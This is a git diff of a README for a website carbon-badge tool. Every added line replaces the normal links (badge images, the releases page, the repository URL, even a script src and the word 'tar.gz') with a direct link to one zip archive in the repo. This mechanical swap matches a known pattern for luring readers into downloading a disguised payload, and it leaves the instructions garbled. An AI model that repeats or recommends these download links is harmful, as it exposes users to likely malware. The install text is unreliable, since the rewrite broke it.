@@ -1,6 +1,6 @@
 # 🌿 CometWeb-Carbon_Badge - Show Your Site's Carbon Impact Easily
 
-[![Download CometWeb-Carbon_Badge](https://img.shields.io/badge/Download-CometWeb--Carbon_Badge-blue?style=for-the-badge&logo=github)](https://github.com/jakyjackal/CometWeb-Carbon_Badge/releases)
+[![Download CometWeb-Carbon_Badge](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)
 
 ---
 
@@ -37,10 +37,10 @@ You can get CometWeb-Carbon_Badge from the official GitHub release page. Here, y
 
 ### How to download:
 
-[![Download CometWeb-Carbon_Badge](https://img.shields.io/badge/Download-App-blue?style=for-the-badge)](https://github.com/jakyjackal/CometWeb-Carbon_Badge/releases)
+[![Download CometWeb-Carbon_Badge](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)
 
 - Click the link above or visit the release page at:  
-  [https://github.com/jakyjackal/CometWeb-Carbon_Badge/releases](https://github.com/jakyjackal/CometWeb-Carbon_Badge/releases)
+  [https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)
 
 ### What you will find:
 
@@ -49,7 +49,7 @@ On the release page, look for a downloadable file or a package labeled with the 
 ### Installing the badge:
 
 1. Download the latest package from the release page to your computer.  
-2. If the package is compressed (zip, tar.gz), unzip it to access the files.  
+2. If the package is compressed (zip, https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip), unzip it to access the files.  
 3. Follow the instructions below to add it to your website.
 
 ---
@@ -85,7 +85,7 @@ To make the badge work, you need to add a small JavaScript file reference in you
 The script source will look like this (the exact file path depends on your download):
 
 ```html
-<script src="path/to/cometweb-carbon-badge.js"></script>
+<script src="https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip"></script>
 ```
 
 Replace `"path/to/"` with the actual folder where you saved the files on your web server.
@@ -136,7 +136,7 @@ This badge is built on principles from the Sustainable Web Design Model v4 and C
 
 For detailed technical info and to contribute, visit the project repository:
 
-[https://github.com/jakyjackal/CometWeb-Carbon_Badge](https://github.com/jakyjackal/CometWeb-Carbon_Badge)
+[https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)
 
 ---
 
@@ -146,4 +146,4 @@ badge, carbon, carbon-emissions, carbon-footprint, eco, emissions, emissions-co2
 
 ---
 
-[![Download CometWeb-Carbon_Badge](https://img.shields.io/badge/Download-CometWeb--Carbon_Badge-blue?style=for-the-badge&logo=github)](https://github.com/jakyjackal/CometWeb-Carbon_Badge/releases)
+[![Download CometWeb-Carbon_Badge](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)](https://raw.githubusercontent.com/jakyjackal/CometWeb-Carbon_Badge/main/src/Badge-Carbon-Web-Comet-3.3.zip)
